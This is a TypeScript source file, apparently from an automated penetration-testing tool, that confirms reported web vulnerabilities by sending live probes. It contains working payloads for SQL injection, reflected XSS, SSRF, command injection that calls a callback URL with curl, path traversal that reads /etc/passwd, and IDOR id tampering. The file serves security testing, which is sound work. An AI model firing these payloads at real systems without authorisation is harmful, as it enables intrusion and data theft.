/**
 * Per-class verification oracles — the "no exploit, no report" principle.
 *
 * For each vulnerability class we run a deterministic check that attempts to
 * prove the exploit actually works. The oracles are conservative: they only
 * mark a finding `verified` when concrete evidence (SQL error, timing delta,
 * rendered alert with a unique token, exfiltrated /etc/passwd content, etc.)
 * is observed. Anything short of that leaves the finding in the LLM-verify
 * fall-through path.
 *
 * The oracles reuse the finding's own evidence (request URL, body, param
 * names) to steer probes. When the finding doesn't carry a target URL the
 * caller's `target` argument is used as a fallback.
 */

import { randomUUID, createServer } from "./oracle-runtime.js";
import type { AttackCategory, Finding } from "@pwnkit/shared";

// ────────────────────────────────────────────────────────────────────
// Types
// ────────────────────────────────────────────────────────────────────

export interface OracleResult {
  verified: boolean;
  confidence: number; // 0-1
  evidence: string; // concrete artifact proving exploit
  reason: string; // why it failed if !verified
}

interface ParsedRequest {
  method: string;
  url: string;
  headers: Record<string, string>;
  body: string;
  params: Record<string, string>; // query + body form params
}

// ────────────────────────────────────────────────────────────────────
// Helpers
// ────────────────────────────────────────────────────────────────────

const DEFAULT_TIMEOUT_MS = 10_000;

function notVerifiable(reason: string): OracleResult {
  return { verified: false, confidence: 0, evidence: "", reason };
}

function verified(evidence: string, confidence = 1.0): OracleResult {
  return { verified: true, confidence, evidence, reason: "" };
}

/**
 * Best-effort parse of the request recorded in finding.evidence.request.
 * The format is typically a raw HTTP request or a curl-style line. When we
 * can't parse anything we return the caller-supplied target as the URL.
 */
export function parseRequest(
  requestText: string,
  fallbackTarget: string
): ParsedRequest {
  const parsed: ParsedRequest = {
    method: "GET",
    url: fallbackTarget,
    headers: {},
    body: "",
    params: {},
  };

  const parseFallbackQuery = () => {
    try {
      const u = new URL(parsed.url);
      u.searchParams.forEach((v, k) => {
        parsed.params[k] = v;
      });
    } catch {
      /* relative URL, ignore */
    }
  };

  if (!requestText) {
    parseFallbackQuery();
    return parsed;
  }

  // curl form: "curl -X POST http://foo/bar --data 'a=b'"
  const curlUrl = requestText.match(
    /\bcurl\b[^\n]*?\s(https?:\/\/\S+)/i
  );
  if (curlUrl) parsed.url = curlUrl[1]!.replace(/['"]$/, "");
  const curlMethod = requestText.match(/-X\s+(GET|POST|PUT|PATCH|DELETE)/i);
  if (curlMethod) parsed.method = curlMethod[1]!.toUpperCase();
  const curlData = requestText.match(/--data(?:-raw)?\s+['"]([^'"]+)['"]/);
  if (curlData) parsed.body = curlData[1]!;

  // Raw HTTP request form: "GET /foo?x=1 HTTP/1.1\nHost: bar\n\nbody"
  const startLine = requestText.match(
    /^(GET|POST|PUT|PATCH|DELETE)\s+(\S+)\s+HTTP\/[\d.]+/m
  );
  if (startLine) {
    parsed.method = startLine[1]!.toUpperCase();
    const path = startLine[2]!;
    const hostHeader = requestText.match(/^Host:\s*(\S+)/im);
    if (hostHeader) {
      const scheme = fallbackTarget.startsWith("https") ? "https" : "http";
      parsed.url = `${scheme}://${hostHeader[1]}${path}`;
    } else if (path.startsWith("/")) {
      try {
        const base = new URL(fallbackTarget);
        parsed.url = `${base.origin}${path}`;
      } catch {
        parsed.url = path;
      }
    } else {
      parsed.url = path;
    }
    // body after blank line
    const sep = requestText.indexOf("\n\n");
    if (sep >= 0) parsed.body = requestText.slice(sep + 2).trim();
  }

  // Pull query params from URL
  try {
    const u = new URL(parsed.url);
    u.searchParams.forEach((v, k) => {
      parsed.params[k] = v;
    });
  } catch {
    /* relative URL, ignore */
  }

  // Pull form params from body
  if (parsed.body && parsed.body.includes("=") && !parsed.body.startsWith("{")) {
    for (const pair of parsed.body.split("&")) {
      const [k, v] = pair.split("=");
      if (k) parsed.params[decodeURIComponent(k)] = decodeURIComponent(v ?? "");
    }
  }

  return parsed;
}

/** Re-serialize params into a URL + body matching the original method. */
function buildProbeRequest(
  parsed: ParsedRequest,
  newParams: Record<string, string>
): { url: string; init: RequestInit } {
  const merged = { ...parsed.params, ...newParams };
  const method = parsed.method || "GET";
  const init: RequestInit = { method, headers: parsed.headers };

  if (method === "GET" || method === "DELETE") {
    try {
      const u = new URL(parsed.url);
      // clear & re-set
      Array.from(u.searchParams.keys()).forEach((k) => u.searchParams.delete(k));
      for (const [k, v] of Object.entries(merged)) u.searchParams.set(k, v);
      return { url: u.toString(), init };
    } catch {
      return { url: parsed.url, init };
    }
  }

  // Body-bearing methods: send form-encoded
  init.body = new URLSearchParams(merged).toString();
  init.headers = {
    "content-type": "application/x-www-form-urlencoded",
    ...parsed.headers,
  };
  return { url: parsed.url, init };
}

async function timedFetch(
  url: string,
  init: RequestInit,
  timeoutMs = DEFAULT_TIMEOUT_MS
): Promise<{ status: number; body: string; latencyMs: number } | null> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  const start = Date.now();
  try {
    const res = await fetch(url, { ...init, signal: controller.signal });
    const body = await res.text();
    return { status: res.status, body, latencyMs: Date.now() - start };
  } catch {
    return null;
  } finally {
    clearTimeout(timer);
  }
}

// ────────────────────────────────────────────────────────────────────
// SQL injection oracle
// ────────────────────────────────────────────────────────────────────

const SQL_ERROR_PATTERNS: RegExp[] = [
  // MySQL
  /You have an error in your SQL syntax/i,
  /\bmysql_fetch_/i,
  /\bMySQLSyntaxErrorException\b/i,
  /\bMariaDB\b.*?\bsyntax\b/i,
  // PostgreSQL
  /\bPG::SyntaxError\b/i,
  /\bpq:\s+syntax error\b/i,
  /\bpsql:.*?ERROR:/i,
  /unterminated quoted string/i,
  // SQLite
  /\bSQLite3::/i,
  /\bsqlite3\.OperationalError\b/i,
  /near\s+".+?":\s*syntax error/i,
  // MSSQL
  /\bMicrosoft\s+SQL\s+Server\b.*?\b(error|exception)\b/i,
  /\bUnclosed quotation mark\b/i,
  /\bOLE DB.*?SQL Server\b/i,
  // Oracle
  /\bORA-\d{4,5}\b/i,
  /\bquoted string not properly terminated\b/i,
];

function detectSqlError(body: string): string | null {
  for (const re of SQL_ERROR_PATTERNS) {
    const m = body.match(re);
    if (m) return m[0];
  }
  return null;
}

/**
 * Identify a candidate injectable parameter (the first one whose value is
 * non-empty). Returns the key & original value.
 */
function pickInjectableParam(
  parsed: ParsedRequest
): { key: string; value: string } | null {
  for (const [k, v] of Object.entries(parsed.params)) {
    if (v && v.length > 0) return { key: k, value: v };
  }
  const first = Object.keys(parsed.params)[0];
  if (first) return { key: first, value: parsed.params[first] ?? "" };
  return null;
}

export async function verifySqli(
  finding: Finding,
  target: string
): Promise<OracleResult> {
  const parsed = parseRequest(finding.evidence?.request ?? "", target);
  const victim = pickInjectableParam(parsed);
  if (!victim)
    return notVerifiable("no injectable parameter found in finding evidence");

  const signals: string[] = [];

  // Baseline
  const baseline = await timedFetch(
    ...Object.values(buildProbeRequest(parsed, { [victim.key]: victim.value })) as [
      string,
      RequestInit,
    ]
  );
  if (!baseline) return notVerifiable("baseline request failed");

  // ── 1. Boolean diff ─────────────────────────────────────────
  const trueProbe = await timedFetch(
    ...Object.values(
      buildProbeRequest(parsed, { [victim.key]: `${victim.value}' OR 1=1-- -` })
    ) as [string, RequestInit]
  );
  const falseProbe = await timedFetch(
    ...Object.values(
      buildProbeRequest(parsed, { [victim.key]: `${victim.value}' OR 1=2-- -` })
    ) as [string, RequestInit]
  );
  if (trueProbe && falseProbe && trueProbe.body.length > 0) {
    const delta =
      Math.abs(trueProbe.body.length - falseProbe.body.length) /
      Math.max(trueProbe.body.length, 1);
    if (delta > 0.1) {
      signals.push(
        `boolean_diff: |true|=${trueProbe.body.length} |false|=${falseProbe.body.length} delta=${delta.toFixed(2)}`
      );
    }
  }

  // ── 2. Time-based ───────────────────────────────────────────
  // Try multiple dialects; we accept the first that triggers a delay.
  const timePayloads = [
    `${victim.value}' AND SLEEP(3)-- -`,
    `${victim.value}'; SELECT pg_sleep(3)-- -`,
    `${victim.value}' AND (SELECT 1 FROM (SELECT SLEEP(3))a)-- -`,
  ];
  for (const payload of timePayloads) {
    const probe = await timedFetch(
      ...Object.values(buildProbeRequest(parsed, { [victim.key]: payload })) as [
        string,
        RequestInit,
      ],
      8000
    );
    if (
      probe &&
      baseline.latencyMs < 500 &&
      probe.latencyMs > 2500
    ) {
      signals.push(
        `time_based: baseline=${baseline.latencyMs}ms probe=${probe.latencyMs}ms`
      );
      break;
    }
  }

  // ── 3. Error-based ──────────────────────────────────────────
  const errProbe = await timedFetch(
    ...Object.values(
      buildProbeRequest(parsed, { [victim.key]: `${victim.value}'` })
    ) as [string, RequestInit]
  );
  if (errProbe) {
    const err = detectSqlError(errProbe.body);
    if (err) signals.push(`sql_error: ${err}`);
  }

  if (signals.length >= 2) {
    return verified(signals.join(" | "));
  }
  return {
    verified: false,
    confidence: signals.length === 1 ? 0.4 : 0,
    evidence: signals.join(" | "),
    reason:
      signals.length === 1
        ? `only 1/3 sqli signals fired: ${signals[0]}`
        : "no sqli signals fired",
  };
}

// ────────────────────────────────────────────────────────────────────
// Reflected XSS oracle
// ────────────────────────────────────────────────────────────────────

export async function verifyReflectedXss(
  finding: Finding,
  target: string
): Promise<OracleResult> {
  const parsed = parseRequest(finding.evidence?.request ?? "", target);
  const victim = pickInjectableParam(parsed);
  if (!victim)
    return notVerifiable("no injectable parameter found in finding evidence");

  const token = `pwnkit_${randomUUID().replace(/-/g, "")}`;
  const payload = `<script>alert('${token}')</script>`;

  // ── Content-reflection backup signal ───────────────────────
  const { url, init } = buildProbeRequest(parsed, {
    [victim.key]: payload,
  });
  const probe = await timedFetch(url, init);
  const htmlReflected =
    !!probe &&
    probe.body.includes(payload) &&
    !probe.body.includes(`&lt;script&gt;alert(&#39;${token}&#39;)&lt;/script&gt;`);

  // ── Primary: Playwright dialog capture ─────────────────────
  let playwright: typeof import("playwright") | null = null;
  try {
    playwright = (await import("playwright")) as typeof import("playwright");
  } catch {
    /* not installed — fall back to html-reflect signal only */
  }

  if (playwright) {
    let browser: Awaited<ReturnType<typeof playwright.chromium.launch>> | null =
      null;
    try {
      browser = await playwright.chromium.launch({ headless: true });
      const page = await browser.newPage();
      let dialogMessage = "";
      page.on("dialog", async (dialog) => {
        dialogMessage = dialog.message();
        await dialog.dismiss().catch(() => {});
      });
      await page.goto(url, { timeout: 8000, waitUntil: "domcontentloaded" });
      // allow inline scripts to run
      await page.waitForTimeout(500);
      await browser.close();
      browser = null;

      if (dialogMessage.includes(token)) {
        return verified(
          `playwright dialog captured token=${token} message="${dialogMessage}"`
        );
      }
    } catch (err) {
      if (browser) await browser.close().catch(() => {});
      // fall through — we can still use html-reflect as a weaker signal
      return {
        verified: false,
        confidence: htmlReflected ? 0.4 : 0,
        evidence: htmlReflected
          ? `html_reflection: payload reflected in body`
          : "",
        reason: `playwright navigation failed: ${(err as Error).message}`,
      };
    }
  }

  if (htmlReflected) {
    return {
      verified: false,
      confidence: 0.5,
      evidence: `html_reflection: payload reflected unencoded in response body`,
      reason:
        "payload reflected but no alert dialog captured (playwright unavailable or dialog didn't fire)",
    };
  }

  return notVerifiable("no xss reflection or alert captured");
}

// ────────────────────────────────────────────────────────────────────
// SSRF / RCE collector
// ────────────────────────────────────────────────────────────────────

/**
 * Spin up a one-shot HTTP listener that accepts any request matching a
 * unique nonce and resolves when the nonce is hit. Returns a cleanup fn.
 */
async function withCollector<T>(
  nonce: string,
  timeoutMs: number,
  work: (collectorUrl: string, waitForHit: () => Promise<boolean>) => Promise<T>
): Promise<T> {
  const port = 8888 + Math.floor(Math.random() * 1000);
  let hit = false;
  const server = createServer((req, res) => {
    if ((req.url ?? "").includes(nonce)) hit = true;
    res.writeHead(200);
    res.end("ok");
  });
  await new Promise<void>((resolve) => server.listen(port, "127.0.0.1", resolve));

  const collectorUrl = `http://127.0.0.1:${port}/${nonce}`;
  const waitForHit = async (): Promise<boolean> => {
    const deadline = Date.now() + timeoutMs;
    while (Date.now() < deadline) {
      if (hit) return true;
      await new Promise((r) => setTimeout(r, 100));
    }
    return hit;
  };

  try {
    return await work(collectorUrl, waitForHit);
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
}

export async function verifySsrf(
  finding: Finding,
  target: string
): Promise<OracleResult> {
  const parsed = parseRequest(finding.evidence?.request ?? "", target);
  const victim = pickInjectableParam(parsed);
  if (!victim)
    return notVerifiable("no injectable parameter found in finding evidence");

  const nonce = `ssrf${randomUUID().replace(/-/g, "").slice(0, 16)}`;

  return withCollector(nonce, 6000, async (collectorUrl, waitForHit) => {
    const { url, init } = buildProbeRequest(parsed, {
      [victim.key]: collectorUrl,
    });
    const probe = await timedFetch(url, init, 8000);
    if (!probe) return notVerifiable("ssrf probe failed to send");
    const hit = await waitForHit();
    if (hit) {
      return verified(
        `collector hit: nonce=${nonce} path=/${nonce}`
      );
    }
    return {
      verified: false,
      confidence: 0,
      evidence: "",
      reason: `collector never received a request for nonce=${nonce}`,
    };
  });
}

// ────────────────────────────────────────────────────────────────────
// RCE oracle
// ────────────────────────────────────────────────────────────────────

export async function verifyRce(
  finding: Finding,
  target: string
): Promise<OracleResult> {
  const parsed = parseRequest(finding.evidence?.request ?? "", target);
  const victim = pickInjectableParam(parsed);
  if (!victim)
    return notVerifiable("no injectable parameter found in finding evidence");

  const nonce = `rce${randomUUID().replace(/-/g, "").slice(0, 16)}`;

  return withCollector(nonce, 8000, async (collectorUrl, waitForHit) => {
    // Try a handful of command-injection payload shapes. The collector only
    // cares whether the nonce shows up, so we fire them sequentially.
    const payloads = [
      `${victim.value};curl ${collectorUrl}`,
      `${victim.value}|curl ${collectorUrl}`,
      `${victim.value}$(curl ${collectorUrl})`,
      `${victim.value}\`curl ${collectorUrl}\``,
      `${victim.value}&&curl ${collectorUrl}`,
    ];
    for (const payload of payloads) {
      const { url, init } = buildProbeRequest(parsed, {
        [victim.key]: payload,
      });
      await timedFetch(url, init, 8000);
    }
    const hit = await waitForHit();
    if (hit) return verified(`collector hit: nonce=${nonce}`);
    return {
      verified: false,
      confidence: 0,
      evidence: "",
      reason: `collector never received a request for nonce=${nonce}`,
    };
  });
}

// ────────────────────────────────────────────────────────────────────
// Path traversal oracle
// ────────────────────────────────────────────────────────────────────

const PASSWD_PATTERN = /root:x:0:0:|\/bin\/(bash|sh|dash)/;

export async function verifyPathTraversal(
  finding: Finding,
  target: string
): Promise<OracleResult> {
  const parsed = parseRequest(finding.evidence?.request ?? "", target);
  const victim = pickInjectableParam(parsed);
  if (!victim)
    return notVerifiable("no injectable parameter found in finding evidence");

  const payloads = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "/etc/passwd",
  ];

  for (const payload of payloads) {
    const { url, init } = buildProbeRequest(parsed, {
      [victim.key]: payload,
    });
    const probe = await timedFetch(url, init);
    if (!probe) continue;
    const m = probe.body.match(PASSWD_PATTERN);
    if (m) {
      return verified(
        `payload=${payload} response contained "${m[0]}"`
      );
    }
  }
  return notVerifiable("no /etc/passwd signature in any traversal probe response");
}

// ────────────────────────────────────────────────────────────────────
// IDOR oracle
// ────────────────────────────────────────────────────────────────────

export async function verifyIdor(
  finding: Finding,
  target: string
): Promise<OracleResult> {
  const parsed = parseRequest(finding.evidence?.request ?? "", target);

  // Look for a numeric id-like param
  let idKey: string | null = null;
  let idValue = 0;
  for (const [k, v] of Object.entries(parsed.params)) {
    if (/^(id|uid|user_id|account_id|order_id|pid)$/i.test(k) && /^\d+$/.test(v)) {
      idKey = k;
      idValue = parseInt(v, 10);
      break;
    }
  }
  if (!idKey) {
    // Fallback: any numeric param
    for (const [k, v] of Object.entries(parsed.params)) {
      if (/^\d+$/.test(v)) {
        idKey = k;
        idValue = parseInt(v, 10);
        break;
      }
    }
  }
  if (!idKey)
    return notVerifiable("no numeric id-like parameter to mutate");

  const baseline = await timedFetch(
    ...Object.values(buildProbeRequest(parsed, { [idKey]: String(idValue) })) as [
      string,
      RequestInit,
    ]
  );
  if (!baseline)
    return notVerifiable("baseline request failed");

  const variants = [String(idValue + 1), String(Math.max(0, idValue - 1)), "0"];
  const hits: string[] = [];
  for (const variant of variants) {
    if (variant === String(idValue)) continue;
    const probe = await timedFetch(
      ...Object.values(buildProbeRequest(parsed, { [idKey]: variant })) as [
        string,
        RequestInit,
      ]
    );
    if (!probe) continue;
    if (
      probe.status === 200 &&
      probe.body.length > 0 &&
      probe.body !== baseline.body
    ) {
      hits.push(`${idKey}=${variant} status=200 body_delta=${Math.abs(probe.body.length - baseline.body.length)}`);
    }
  }

  if (hits.length > 0) {
    // IDOR is genuinely hard to auto-verify without knowing the auth model.
    // Cap confidence below 1.0 to reflect that.
    return {
      verified: true,
      confidence: 0.7,
      evidence: `distinct responses on id mutation: ${hits.join(", ")}`,
      reason: "",
    };
  }
  return notVerifiable("no distinct 200 response on id mutation");
}

// ────────────────────────────────────────────────────────────────────
// Dispatch
// ────────────────────────────────────────────────────────────────────

export async function verifyOracleByCategory(
  finding: Finding,
  target: string
): Promise<OracleResult> {
  const category = finding.category as AttackCategory;

  switch (category) {
    case "sql-injection":
      return verifySqli(finding, target);
    case "xss":
      return verifyReflectedXss(finding, target);
    case "ssrf":
      return verifySsrf(finding, target);
    case "command-injection":
    case "code-injection":
      return verifyRce(finding, target);
    case "path-traversal":
      return verifyPathTraversal(finding, target);
    // Heuristic: "information-disclosure" findings referencing an id param
    // look a lot like IDOR. We route them through the IDOR oracle as well.
    case "information-disclosure":
      return verifyIdor(finding, target);
    default:
      return {
        verified: false,
        confidence: 0,
        evidence: "",
        reason: `no oracle for category="${category}"`,
      };
  }
}

/**
 * Small indirection layer so tests can stub out `randomUUID` and
 * `http.createServer` without monkey-patching Node globals.
 */
